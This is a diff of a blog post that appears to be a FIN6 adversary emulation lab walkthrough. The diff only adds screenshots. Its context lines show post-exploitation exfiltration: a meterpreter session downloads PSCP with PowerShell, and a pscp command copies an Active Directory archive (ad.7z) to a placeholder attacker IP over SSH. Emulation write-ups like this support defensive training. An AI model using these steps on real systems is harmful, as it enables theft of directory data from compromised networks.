@@ -443,6 +443,8 @@ But before that, we need to check if SSH port is already open our the AttackerVM
 nmap -sV [Attacker IP]
 ```
 
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-4_2_NMAP_SSH_Close.png){:width="100%"}
+
 Based on the Nmap scan, we can see that we only one open port which is the HTTP server that we have created earlier.
 
 You can execute the following command to install and enable the remote SSH open server in Kali Linux
@@ -451,6 +453,8 @@ You can execute the following command to install and enable the remote SSH open 
 service ssh start
 service ssh status
 ```
+
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-4_2_Service_SSH_Open.png){:width="100%"}
 
 Now, let's get back to the <kbd>meterpreter</kbd> console and load <kbd>powershell</kbd> module:
 
@@ -465,11 +469,15 @@ Then start to download `PSCP` using the following command:
 Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -OutFile .\pscp.exe
 ```
 
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-4_2_PowerShell_Download_PSCP.png){:width="100%"}
+
 Once downloaded, exit to the <kbd>powershell</kbd> module since we need to load the <kbd>shell</kbd> module in order for `PSCP` to execute properly:
 
 ```bash
 meterpreter > shell
 ```
+
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-4_2_Open_CMD_Shell.png){:width="100%"}
 
 We can now transfer the file `ad.7z` back to our Attacker VM using the following command:
 
@@ -478,6 +486,8 @@ C:\Users\Administrator\Downloads>.\pscp.exe -P 22 .\ad.7z [username]@[Attacker I
 ```
 
 Once executed, type `y` to store and cache the key of the AttackerVM and then type the password:
+
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-4_2_PSCP_Exfiltration.png){:width="100%"}
 
 FIN6
 
